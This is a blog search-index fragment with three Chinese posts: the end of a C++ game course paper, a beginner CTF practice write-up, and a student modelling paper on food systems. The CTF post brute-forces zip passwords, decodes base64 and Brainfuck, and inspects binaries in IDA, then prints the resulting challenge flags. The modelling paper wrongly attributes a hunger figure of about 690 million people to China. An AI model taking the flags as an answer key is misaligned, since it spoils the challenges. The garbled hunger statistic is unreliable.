class="token string">" "</span> <span class="token operator">&lt;&lt;</span> score <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>    file1<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过ifstream和ofstream两个类进行操作，实现数据的存储于写入。也通过键盘操作识别Esc按钮实现暂停操作。</p><p>图4为飞机大战程序登录界面，图5为程序运行截图</p><img src=".\基于C++的可视化飞机大战游戏\程序登录界面.png" style="zoom:80%;" /><center>  图4 程序登录界面 </center><img src=".\基于C++的可视化飞机大战游戏\程序运行截图.png" style="zoom: 80%;" /><center> 图5 程序运行截图</center><h4 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h4><p>基于C++的可视化飞机大战游戏是一个简单的可视化的小游戏，玩家能够通过鼠标或键盘进行操控飞机的移动和攻击，并且运用了文件操作技术，可以实现数据的永久性保存。基于C++的飞机大战游戏是采用C++语言及其easyX拓展模块开发完成的。本项目实现了游戏流程中的所有功能，界面布局更加人性化,并有着良好的可扩展性。但游戏依旧存在一些不足之处，比如说本游戏还没有实现对玩家操纵飞机进行血量的显示，敌方飞机尚无法发射子弹，对击中逻辑的判断还存在问题。</p><h4 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h4><p>[1]黄宝贵等.C++面向对象程序设计[M] 北京:清华大学出版社，2019:2-3<br>[2]童晶编著.C语言程序设计与游戏开发实践教程[M] 北京:清华大学出版社 2017:16<br>[3]黄维通等.Visual C++面向对象与可视化程序设计[M]（第三版）北京:清华大学出版社 2011:14<br>[4]郑莉等编著.C++程序设计语言(第三版)[M].北京:清华大学出版社,2005:134-139.<br>[5]刘振安等编著.C++程序设计课程设计[M] 北京:机械工业出版社,2004:23-31  [6]朱立华等编著.面向对象程设计及C++[M].北京:人民邮电出版社,2008:43  [7]郑莉,董渊.C++语言程序设计(第二版) [M].北京清华大学出版社,2002:23  [8]陈维兴,林小茶.C++面向对象程序设计教程(第2版)[M].北京清华大学出版社.2007:34</p>]]></content>
      
      
      <categories>
          
          <category> 项目设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 课程论文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QFNUCTF春季练习赛结题记录</title>
      <link href="/2021/07/30/QFNUCTF%E6%98%A5%E5%AD%A3%E7%BB%83%E4%B9%A0%E8%B5%9B%E7%BB%93%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/07/30/QFNUCTF%E6%98%A5%E5%AD%A3%E7%BB%83%E4%B9%A0%E8%B5%9B%E7%BB%93%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><h4 id="1-二维码"><a href="#1-二维码" class="headerlink" title="1 二维码"></a>1 二维码</h4><p>题目下载出的压缩包中是一张二维码<br>这张二维码，用手机扫一扫后输出secret in here .试了一下这东西不是flag，使用Formost分解图片找到了一个压缩包，里面的txt文件名字叫做4.number。<br><img src="https://upload-images.jianshu.io/upload_images/24919094-cc97408e49939ec3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p><p>使用软件进行爆破，得到密码7639，得到flag：CTF{vjpw_wnoei}</p><h4 id="2-基础破解"><a href="#2-基础破解" class="headerlink" title="2  基础破解"></a>2  基础破解</h4><p>给你一个压缩包，你并不能获得什么，因为他是四位数字加密的，嗯题干说的很清晰，密码是四位数字加密的，同样暴力跑下，得到结果2563，输入打开密码文件，得道，</p><pre class="line-numbers language-none"><code class="language-none">ZmxhZ3s3MDM1NDMwMGE1MTAwYmE3ODA2ODgwNTY2MWI5M2E1Y30&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>很明显这是base64编码,使用工具解码得flag{70354300a5100ba78068805661b93a5c}，换成相应格式就可以提交了。</p><h3 id="3-大白-●—●"><a href="#3-大白-●—●" class="headerlink" title="3 大白(●—●)"></a>3 大白(●—●)</h3><p>大白这道题真是一道老题，使用winhex修改图片高度就可以得到flag，但是在之前我的winhex被我玩坏了，重下外带激活，忙活了老一阵。</p><p>####4 多种方法解决<br>从平台下载下来到文件是exe类型，但是无法正常打开，修改拓展名为txt，发现文件头是：</p><blockquote><p>data:image/jpg;base64,</p></blockquote><p>这个是将jpg文件转化成的base64编码，使用工具<a href="http://tool.chinaz.com/tools/imgtobase">base64图片在线转换工具</a>将base64编码专为图片，扫描图片得到flag，KEY{dca57f966e4e4e31fd5b15417da63269}</p><h4 id="5-爱因斯坦"><a href="#5-爱因斯坦" class="headerlink" title="5 爱因斯坦"></a>5 爱因斯坦</h4><p>题目下载下来是一张爱因斯坦的表情包，在图片的属性中有备注this_is_not_password，那么我觉得应该是在图片中有压缩包，使用formost进行分解，得到压缩包，但是txt文件解压需要密码，密码来源我觉得是在图片的高度上，毕竟1366,768可能被隐藏了一部分，然后由于我渣渣的winhex使用，图片高度每有调整，我还不知道如何解决。<br>设想使用暴力破解，但是试了6位没有，实验七位时间已经超过数个小时，这样绝对行不通。<br>在这个题中我唯一知道的信息是this_is_not_password，实验下，结果就是这个。<br>打开txt文档flag{dd22a92bf2cceb6c0cd0d6b83ff51606}</p><h4 id="6-神秘龙卷风"><a href="#6-神秘龙卷风" class="headerlink" title="6 神秘龙卷风"></a>6 神秘龙卷风</h4><p>题干描述科学家用四位数字为它命名，和之前一样，爆破得到密码5463，打开压缩文件，打开txt文件神秘的龙卷风，好家伙这不就是Brainfuck编码吗？</p><p><img src="https://upload-images.jianshu.io/upload_images/24919094-6678e719593812b1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>将文本内容复制，用在线工具将他转化为txt得到flag{e4bbef8bdf9743f8bf5b727a9f6332a8}</p><h4 id="7-刷新过的图片"><a href="#7-刷新过的图片" class="headerlink" title="7 刷新过的图片"></a>7 刷新过的图片</h4><p>没做出来</p><h4 id="8-wireshark"><a href="#8-wireshark" class="headerlink" title="8 wireshark"></a>8 wireshark</h4><p>使用wirshark追踪http流得到，在追踪多个http流后发现有</p><pre class="line-numbers language-none"><code class="language-none">email&#x3D;flag&amp;password&#x3D;ffb7567a1d4f4abdffdb54e022f8facd&amp;captcha&#x3D;BYUGHTTP&#x2F;1.1 200 OKDate: Mon, 29 Jun 2015 15:09:10 GMTContent-Type: text&#x2F;html; charset&#x3D;UTF-8Transfer-Encoding: chunkedConnection: keep-aliveExpires: Thu, 19 Nov 1981 08:52:00 GMTCache-Control: no-store, no-cache, must-revalidate, post-check&#x3D;0, pre-check&#x3D;0Pragma: no-cacheServer: yunjiasu-nginxCF-RAY: 1fe28d0a63e91c3b-JXGContent-Encoding: gzip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>email=flag&amp;password=ffb7567a1d4f4abdffdb54e022f8facd&amp;captcha=BYUG得到flag</p><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><h4 id="1-easy-re"><a href="#1-easy-re" class="headerlink" title="1 easy.re"></a>1 easy.re</h4><p>由于做逆向少，ctftools里的工具又不知道为什么打不开easy.exe，从网上下载了IDA就那个图标很磕碜的软件，easy.red的flag就在main（）里<br><img src="https://upload-images.jianshu.io/upload_images/24919094-8aab620e79a564b3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>“flag{this_Is_a_EaSyRe}”</p><h4 id="2-reverse-1"><a href="#2-reverse-1" class="headerlink" title="2 reverse_1"></a>2 reverse_1</h4><p>说实话这道题我是用最笨的方法做的，将文件用IDA反编译，从头到尾一个个的找下去，在sub_1400118C0这个项目里面找到了“hello world”这个可能是flag的东西，<br><img src="https://upload-images.jianshu.io/upload_images/24919094-c2f7d359bfd385ad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>this is the right flag!更加坚定了我的想法，尝试输入，不对。之后憨憨的从这里到下面全部翻了一遍，试了几个字符串发现没有结果后，最后又回到这里。<br>考虑到之前做bugku的题目有的题目有我们解出的是o，在需要输入的flag上却是0的情况，试着输入0代替o，然后correct。<br>QFNU{hell0_w0rld}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 解题记录 </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数学建模：全球食品系统再优化</title>
      <link href="/2021/07/17/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%EF%BC%9A%E5%85%A8%E7%90%83%E9%A3%9F%E5%93%81%E7%B3%BB%E7%BB%9F%E5%86%8D%E4%BC%98%E5%8C%96/"/>
      <url>/2021/07/17/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1%EF%BC%9A%E5%85%A8%E7%90%83%E9%A3%9F%E5%93%81%E7%B3%BB%E7%BB%9F%E5%86%8D%E4%BC%98%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2><center>数学建模：全球食品系统再优化</center></h2>### 摘要：<p>本文对全球食品系统进行了粗略的研究，试图解析全球食品体系并对此体系进行验证与实际的应用</p><blockquote><p>我们建立了一个综合的评价模型、优化模型和时间预测模型。在食品系统的综合评价模型中，我们利用熵法和变异系数法找到主要指标和次要指标的权重，使这些指标可以归因于一个数据。最后通过这些相关数据对系统模型进行观察研究，从而探索出该数据对模型的影响、以及所产生的影响对实际问题有什么作用与意义，借此研究全球的食品体系。</p></blockquote><p>我们首先尝试研究中国的食品体系，再将研究中国所得到的结论用于发达国家美国进行扩展测试，这样可以进一步演算模型的可靠性与泛用性，从而能使该模型在以后的实际问题研究中（即研究除中国、美国之外的其他国家的食品体系）能够产生实际的作用，以便于得到可靠度较高的数据（当然存在灵敏值的差异，但尽可能缩小该灵敏值）去应用与我们相关的数学建模与课题研究中去，解决实际的问题。而不是为了计算而计算，我们更加注重数据的实用性与普适性。</p><p>然后我们计算了FSI、更改和更改优先级之后和数据。用于验证模型的稳定性，以保障我们的模型可以更加真正地反映了实际情况。</p><h3><center>目录</center></h3>[TOC]<h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3><p>2015年，联合国各国承诺制定《2030年可持续发展议程》。该议程认识到，必须超越饥饿，确保实现全年人人获得充足、安全、营养价值高的食物的目标，并消除一切形式的营养不良。</p><p>食品系统的是否健全对人类社会的发展起着至关重要的作用。目前的食品系统仍面临着许多挑战，世界上饥饿人口的数量一直在缓慢增长，因此重新优化一个强大的食品系统至关重要。只有进一步优化了全球食品系统，才能保证在以后能科学客观地分析全球的粮食资源分配以及饥饿人口的变化趋势，从而能利用科学的大数据来更加具体地解决实际的问题。</p><p>2020年联合国粮农组织，重新评定了中国的粮食状况，在中国大规模脱贫，消除绝对贫困的背景下依旧有，近6.9亿人处于饥饿状态，占世界人口的8.9%，一年内增加了1000万人，五年内增加了近6000万人。</p><p>尽管重新评估了中国的饥饿程度，但世界上大多数营养不良的——3.81亿人仍然存在于亚洲。2.5亿多人生活在非洲，那里的营养不良人口增长快于世界任何其他地区^[1]^。所以，全球的食品系统优化问题不可忽视。</p><p>本优化模型由三位同学合作完成。L1同学负责模型构建与计算；L2同学负责提出假设，问题分析以及模型评价部分；G同学负责数据收集图标制作等工作。</p><h3 id="1-问题重述"><a href="#1-问题重述" class="headerlink" title="1. 问题重述"></a>1. 问题重述</h3><p>联合国估计全世界仍有 8.21 亿人遭受饥饿，此外，当前的粮食系统对环境产生了巨大的影响，随着我们的全球人口持续增长，而我们却经历了数十年环境滥用的日益严重的影响，在维持甚至改善我们的环境健康的同时提供更多的食物 从未如此重要。</p><p>国际食品管理(ICM)委员会要求您的团队开发一个模型来重新构想我们的食 品系统并重新确定其优先级。ICM 委员会让你的团队来决定这些系统的哪些方面。 </p><p>值得成为建模活动的重点。您的团队应该提供一个足够健壮的食品系统模型，以便能够根据效率、盈利能力、可持续性和/或公平性的不同水平对其进行优化调整。 </p><p>无论您关注全球或本地的范围如何，食物系统都很复杂。您应该考虑的一些 </p><p><strong>问题包括但不限于：</strong> </p><ul><li>如果考虑公平性和可持续性，应该如何优化粮食系统？优化后的新系统与当前系统有何不同？这样的系统实施需要多长时间？ </li><li>改变粮食系统重点的收益和成本是什么？它们什么时候发生？这些收益和成本在发达国家和发展中国家之间有何不同？ </li><li>建立食品系统模型后，将模型应用于至少一个发达国家和一个发展中国家，以支持您的发现</li><li>讨论模型的可伸缩性和适应性。</li></ul><h3 id="2-模型假设："><a href="#2-模型假设：" class="headerlink" title="2. 模型假设："></a>2. 模型假设：</h3><p>根据题意进行如下假设</p><ol><li>所有的农业机械在建模中不做区分，视为同一变量</li><li>粮食耕地不做自然环境的区分，权作为单一变量</li><li>忽略农村人口中，非农业人口数量</li><li>忽略战争，天灾等不可抗力影响</li></ol><h3 id="3-问题分析："><a href="#3-问题分析：" class="headerlink" title="3. 问题分析："></a>3. 问题分析：</h3><p>全球粮食系统，在我们团队的认知中最重要的并非是庞大的国家和国际食品生产商和分销商组成的全球体系，而是各个国家实际上的粮食产量。</p><p>由于时间和团队等多方面的制约，本次全球食品系统再优化的尝试，只进行粮食系统的生产方向的优化，试图以多变量的优化分析中国粮食产量自2002年至今的快速增加，并在全球范围内对比其他国家验证所构建的模型。</p><p>我们试图分析中国粮食作物总量与化肥消耗，谷物耕地面积，农村人口，农机具保有量等多参数的影响。建立多变量的优化模型。</p><h3 id="4-样例分析"><a href="#4-样例分析" class="headerlink" title="4. 样例分析"></a>4. 样例分析</h3><h4 id="4-1、-发展中国家：中国"><a href="#4-1、-发展中国家：中国" class="headerlink" title="4.1、 发展中国家：中国"></a>4.1、 发展中国家：中国</h4><p>获取到的数据中，最早时间是1960年，那时的中国还是一个较为落后的农业国家，但通过不断改革和优化其粮食农业体系，是中国的农业发展有了明显的上升趋势，具体表现为近一段时间与上世纪60年代到世纪末表现出完全不同的生产状态，为增加模型精度，特从2003年开始计算。以保障本优化模型的可靠性。</p><p>按照农业进口出口比例计算，2018年中国粮食进口24948734吨，出口34577854，总产量614697756吨，自给率达96.41%，并主要集中于大豆等经济作物。国家的食品供应能力在全球位居前列。中国耕地面积为1432960平方公里，中国政府用占据世界上%7的耕地面积，养活了占世界人口总数20%的中国人民。</p><p>由于上世纪末至本世纪初的十年间，中国耕地面积下降。中国政府在2009年化设耕地红线即15.60亿亩的基本农田数。中国谷物耕地面积至2002年的低点逐年上升</p><p>表1为中国谷物耕地面积，表2为中国农业GDP，表3为化肥消费数,表4为中国农业机械数量列表。</p><img src="./数学建模：全球食品系统再优化/中国谷物耕地面积.jpg" style="zoom: 67%;" /><center>表1 中国谷物耕地面积（公顷）</center><img src="./数学建模：全球食品系统再优化/中国农业GDP.jpg" alt="表2 中国农业GDP（美元）" style="zoom: 67%;" /><center>表2 中国农业GDP（美元）</center><img src="./数学建模：全球食品系统再优化/化肥消费数.jpg" alt="表3 化肥消费数（千克）/公顷" style="zoom:67%;" /><center>表3 化肥消费数（千克）/公顷</center><img src="./数学建模：全球食品系统再优化/中国农业机械数量.jpg" alt="表4 中国农业机械数量" style="zoom:67%;" /><center>表4 中国农业机械数量</center><p>由已知信息可以看出在2002年后，中国农业GDP的曲线与中国耕地面积的曲线十分接近，有理由相信耕地面积是影响农业GDP的最主要因素。</p><h4 id="4-2、-发达国家样本：美利坚合众国"><a href="#4-2、-发达国家样本：美利坚合众国" class="headerlink" title="4.2、 发达国家样本：美利坚合众国"></a>4.2、 发达国家样本：美利坚合众国</h4><p>美国是当今全球最为发达的国家，农业高度发达和高度的机械-现代化。美国的农业自给率极高，按照出口/进口的自给率计算，美国的自给率高达119.56%。为世界主要粮食出口国之一。国家为农业提供一定的财政补贴，以确保农业生产。同时，美国为农业发展提供了大量的政策支持。</p><p>美国是一个发达国家，它的农产品产量和各项指标更稳定，仍处于较高水平，在相邻几年之间只有轻微的上下波动</p><h3 id="5-模型建设："><a href="#5-模型建设：" class="headerlink" title="5. 模型建设："></a>5. 模型建设：</h3><ul><li>由已知数据建立（数据见附录1）</li></ul><h4 id="5-1模型的思路设计"><a href="#5-1模型的思路设计" class="headerlink" title="5.1模型的思路设计"></a>5.1模型的思路设计</h4><p>按照统计学的观点，以化肥消耗，谷物耕地面积，农村人口，农机具保有量占比作为参数建立一个四维随机变量，记作x=(x1,x2,x3,x4)^T^,用一组单位向量(a,b,c,d)假设为相应参数。</p><p><strong>列出对应的矩阵：</strong></p><img src="./数学建模：全球食品系统再优化/模型矩阵.png" alt="模型矩阵"/><p><strong>简记作:</strong></p><ul><li>Y=A<del>x</del>，A=(a,b,c,d)^T^</li></ul><p>a,b,c,d称为主成分系数。一般要求y1，y2，y3，y4，之间互不相关，保证协方差矩阵Coy（y）为对角阵</p><p>按照y的协方差矩阵应为对角阵的要求，有：</p><img src="./数学建模：全球食品系统再优化/协方差矩阵.png" alt="协方差矩阵"  /><p>我们分析了2003至2019年的相关数据对矩阵进行求解。从中挑选不关联年份(2003,2008,2013,2018)建立矩阵，求解向量A(a,b,c,d)^T^</p><img src="./数学建模：全球食品系统再优化/协和矩阵.png"  /><p>用协和矩阵或相关系数矩阵使用Matlab的pcacov函数进行主成分分析求得，(a,b,c,d)^T^，使用Matlab进行求解，得到(a,b,c,d)^T^ ，此时，我们令(a,b,c,d)^T^  = A,</p><p>可以得到:Y=Ax并且<img src="./数学建模：全球食品系统再优化/wps9.png" style="zoom:67%;" />，即A = (a,b,c,d)^T^ ；从而建立一个具体的模型，使问题不再抽象，a<del>1</del> ,a<del>2</del> ,…,a<del>p</del>称为主成分系数。这些主成分系数可以通过SPSS进行计算</p><h4 id="5-2-模型在软件中的实现"><a href="#5-2-模型在软件中的实现" class="headerlink" title="5.2 模型在软件中的实现"></a>5.2 模型在软件中的实现</h4><p>将数据放入SPSS中并进行主成分分析，就可获得我们想要的数据</p><h5 id="5-2-1-检验各元素之间的关联程度"><a href="#5-2-1-检验各元素之间的关联程度" class="headerlink" title="5.2.1 检验各元素之间的关联程度"></a>5.2.1 检验各元素之间的关联程度</h5><ul><li>KMO和巴特利特检验  </li></ul><table><thead><tr><th>KMO 取样适切性量数</th><th></th><th>.686</th></tr></thead><tbody><tr><td>巴特利特球形度检验</td><td>近似卡方</td><td>90.887</td></tr><tr><td></td><td>自由度</td><td>6</td></tr><tr><td></td><td>显著性</td><td>&lt;.001</td></tr></tbody></table><p>一般情况下，KMO值应大于等于0.6，Sig值应小于等于0.05，元素之间关联程度。由数据可见，各元素之间关联性较大，可以用其它的表格去求取主成分系数。</p><h5 id="5-2-2-根据SPSS所给的特征值和成分矩阵算出主成分系数"><a href="#5-2-2-根据SPSS所给的特征值和成分矩阵算出主成分系数" class="headerlink" title="5.2.2 根据SPSS所给的特征值和成分矩阵算出主成分系数"></a>5.2.2 根据SPSS所给的特征值和成分矩阵算出主成分系数</h5><img src="./数学建模：全球食品系统再优化/总方差解释.png" style="zoom:67%;" /><center>总方差解释</center><img src="./数学建模：全球食品系统再优化/碎石图.jpg" alt="碎石图" style="zoom: 67%;" /><center>碎石图</center><img src="./数学建模：全球食品系统再优化/成分矩阵.png" style="zoom:67%;" /><p>设成分i中对应的第j个变量的主成分为pij,第i个特征值为ri, aij表示yi中xi前的系数, ki表示特征值的累计（占比），x`i为标准化后的变量，yi为主成分得分，所以由结论可得：</p><img src="./数学建模：全球食品系统再优化/分析结论.jpg"  /><pre class="line-numbers language-none"><code class="language-none">y1&#x3D;a11x&#96;1+a12x&#96;2…+a1px&#96;py2&#x3D;a21x&#96;1+a22x&#96;2+…+a2px&#96;pyn&#x3D;an1x&#96;1+an2x&#96;2+…+anpx&#96;p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>综合得分：y=k1<em>y1+k2</em>y2+…+kn*yn</p><p>在本数据中，主成分分别为p1,p2,p3,p4,特征值为r1,r2,r3,r4,根据碎石图可知，占比最高的特征值只有一个，所以只要求取y=a1x<code>1+a2x</code>2+a3x<code>3+a4x</code>4中的主成分系数即可。</p><h5 id="5-2-3-算出最终的综合得分"><a href="#5-2-3-算出最终的综合得分" class="headerlink" title="5.2.3 算出最终的综合得分"></a>5.2.3 算出最终的综合得分</h5><p>经过计算得出：<strong>y=0.487x <del>1</del>+0.516x<del>2</del>+0.480<del>x3</del>-0.516<del>x4</del></strong></p><p>再在SPSS的数据编辑器中算出x<del>1</del>,x<del>2</del>,x<del>3</del>,x<del>4</del> </p><img src="./数学建模：全球食品系统再优化/SPSS计算结果.jpg" alt="x~1~,x~2~,x~3~,x~4~" style="zoom:67%;" /><p>再列出表达式算出综合得分</p><img src="./数学建模：全球食品系统再优化/wps13.jpg" style="zoom:67%;" /><h5 id="5-2-4-综合得分与实际的比较"><a href="#5-2-4-综合得分与实际的比较" class="headerlink" title="5.2.4 综合得分与实际的比较"></a>5.2.4 综合得分与实际的比较</h5><p>将粮食总产量标准化后的数据与主成分得分进行比较，变化趋势基本一致，所以用SPSS进行对粮食总产量的评定具有可操作性</p><img src="./数学建模：全球食品系统再优化/wps14.jpg" style="zoom:67%;" /><h4 id="5-3-分析主成分系数"><a href="#5-3-分析主成分系数" class="headerlink" title="5.3 分析主成分系数"></a>5.3 分析主成分系数</h4><p>首先，由上面的计算可知，谷物耕地面积，农业机械总量，化肥消费量，农村人口所对应的系数分别为0.487，0.516，0.480，-0.516。所以，谷物耕地面积，农业机械总量，化肥消费量对粮食总量有促进作用，三者相差不大，而农业机械总量所对应的系数偏大一点，这表示随着现代化，高新技术的农业机械运用到农业中，农业也大幅度增产，与此同时，农村逐步实现现代化，需要的劳动力也逐渐减少，也有部分农村发展成城市，农村人口同时也减少，所以农村人口所对应的系数为负值。</p><h4 id="5-4-得出结论"><a href="#5-4-得出结论" class="headerlink" title="5.4 得出结论"></a>5.4 得出结论</h4><p>我们要继续促进农村的现代化，实现农业机械的现代化，谷物耕地面积，化肥消费量也不可以减少，与此同时，也要加强新农村的建设，在不影响农业所需要的劳动力同时，适当地将农村人向城市人过渡。这些因素可以一定程度上，促进粮食总产量</p><h3 id="6-灵敏度分析："><a href="#6-灵敏度分析：" class="headerlink" title="6. 灵敏度分析："></a>6. 灵敏度分析：</h3><p>我们将目标函数写成偏导的形式</p><img src="./数学建模：全球食品系统再优化/灵敏度分析.png"  /><p>对于每一个数据的偏导数实际上即向量A的各项系数。A=0.487,b=0.516,c=0.48,d=-0.516;</p><p>我们通过改变每个指标的权重来优化当前的食品系统。为了证明我们开发的模型的鲁棒性，我们选定了发达国家：美国、以及发展中国家：中国，并对他们的年度FSI指数进行分析研究，我们得到以下结论：</p><p>美国与中国的FSI指数走向都稳定趋势。但针对于其他发展中国家如尼泊尔，可以发现其FSI指数有着明显的剧烈波动。此外，对于不同国家，FSI指数曲线在短时间内相对于当前系统没有显著变化。当前各国的拟合曲线与各个国家发展状况大体保持一致。这表明，我们的模型可以很好地适合当前的系统。这也可以证明我们的模型的稳定性，因此我们可以使用该模型对这个这个国家的粮食系统做一些简单的评估与研究。</p><h3 id="7-结论分析："><a href="#7-结论分析：" class="headerlink" title="7. 结论分析："></a>7. 结论分析：</h3><h3 id="8-模型评价："><a href="#8-模型评价：" class="headerlink" title="8. 模型评价："></a>8. 模型评价：</h3><h4 id="8-1-优势："><a href="#8-1-优势：" class="headerlink" title="8.1 优势："></a>8.1 优势：</h4><ol><li>指标被充分考虑，数据相对严格，以方差衡量信息的无监督学习，不受样本标签限制。从而适用于许多国家和地区</li><li>利用熵加权法确定每个指标的权重更加客观，并将定性分析转化为定量分析，这更有说服力</li><li>利用少数指标代替多数指标，利用PCA降维是最常用的算法。通过量化该指数的结果，我们可以使评估该指数的等级变得更有说服力，从而判断食品系统的优点</li><li>该模型通过建立组合指标FSI和成本效益指标的回归方程式和迭代计算，充分考虑了这些指标之间的相关性</li><li>使用本模型，进行合理改造生产，能够在一定程度时解决由粮食产量不足带来的粮食短缺问题</li><li>使用该模型使计算方法简单化，更有利于借助计算机来实现数据模型的搭建</li></ol><h4 id="8-2-不足-："><a href="#8-2-不足-：" class="headerlink" title="8.2 不足 ："></a>8.2 不足 ：</h4><ol><li>由于时间等客观因素的限制，我们不评估其他有不同条件的国家食品系统发展概况。如在自然条件极其恶劣的国家和地区的模型应与本模型不同</li><li>面对食物系统优化，如饮食结构，缺乏考虑到人的可接受性。比如西方国家对肉食的大量消耗</li><li>该模式没有考虑到国家政策，自然灾害、外部资金和其他政策的影响</li><li>在一些情况下，过于理想化，将不同的土地，不同的机械种类，看做完全相同。过于的理想化，在具体与测时存在较大误差</li><li>本优化只涉及到粮食生产环节，在整个粮食系统中生产只占据其中的一个环节。对于粮食这一大宗商品的的全球贸易和运输分配等问题没有做出研究</li><li>在研究方法上，我们设计的主成分解释其含义往往具有一定的模糊性，不如原始数据样本完整，一定程度上会使误差增大</li><li>数学建模计算问题上，特征值矩阵的正交向量空间是否唯一有待讨论，可能存在一定的偶然性 </li></ol><h4 id="8-3-进一步讨论："><a href="#8-3-进一步讨论：" class="headerlink" title="8.3 进一步讨论："></a>8.3 进一步讨论：</h4><ul><li>适用性：</li></ul><blockquote><p>评估中国和美国两国农业生产的结果与两国目前的发展状况基本一致，表明该模型具有非常强大的普适性，即不同的地区不同发展水平的国家都可以应用该模型。 都可以得到较为具体的数据</p></blockquote><ul><li>创新性：</li></ul><blockquote><p>对问题所牵扯的变量进行数学化，具体化，以便于理解与应用，更便于实际问题的解决</p></blockquote><ul><li>优化方向：</li></ul><blockquote><p>下一步的优化工作一方面是对已有四个维度进行细化，对于土地面积维度，我们可以根据不同的维度位置，土壤种类进行分类增加参数，提高模型精度。对于农业机械，大型农机具与中小型农机具有本质的不同，也是可以继续优化的内容。</p></blockquote><h3 id="9-研究结论"><a href="#9-研究结论" class="headerlink" title="9. 研究结论"></a>9. 研究结论</h3><p>发达国家的生产状况和社会结构相较于其他发展中国家更加稳定，人民生活也更加安全与富足，因此，我们建议集中解决国家的环境问题和人民的饮食习惯，确保均衡健康的饮食。但是作为发展中国家，其主要目标首先是有足够的食品养活人民，这就要求了国家当局者的首要民生工作必须是增加粮食年生产总量，重点是农业基础设施建设，以及与农业相关的政策补贴，通过对农业生产的大力调整来保障人民的基本生计。 </p><p>作为研究对象的中美两个国家在全球粮食生产上都占有的举足轻重的地位，美国是世界上最大的粮食出口国，中国是世界最大的粮食生产国，且两者在全球范围上耕地面积十分巨大；从事粮食生产与加工的人员也是占据着大量的全球人口比重。研究两个国家的农业发展规律对世界粮食系统可谓是影响巨大。</p><p>耕地面积，对一个国家的粮食中产量起着最为关键的作用，当然，在保持耕地面积的基础上，像农业生产的机械数量与从事农业生产的人口比重也都对一个国家的粮食总产量有着不可忽略的影响</p><h3 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h3><p>[1]2020年联合国粮农组织年度报告</p>]]></content>
      
      
      <categories>
          
          <category> 数学建模 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数学建模 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
